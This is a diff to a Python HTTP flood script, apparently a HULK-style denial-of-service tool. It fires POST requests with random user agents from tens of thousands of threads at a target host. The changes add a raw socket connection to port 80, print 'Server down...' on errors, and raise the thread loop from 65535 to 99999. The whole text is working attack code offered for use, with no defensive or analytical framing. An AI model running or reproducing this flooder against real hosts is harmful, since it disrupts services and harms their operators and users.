@@ -13,6 +13,7 @@ import threading
 import random
 import re
 import time
+import socket
 #global params
 url=''
 host=''
@@ -88,15 +89,17 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
 	request.get_method = lambda: "POST"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
 			urllib2.urlopen(request)
-	except:
+			s.connect((host,80))
+	except socket.error:
 			#print e.code
 			
 		
 			code=500
 	
-			print "Sending packets..."
+			print "Server down..."
 	else:
 			inc_counter()
 			urllib2.urlopen(request)
@@ -142,11 +145,11 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in range(65535):
+		for i in range(99999):
                         
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
 		t.start()
-		time.sleep(0.01)
+		time.sleep(0.1)
  
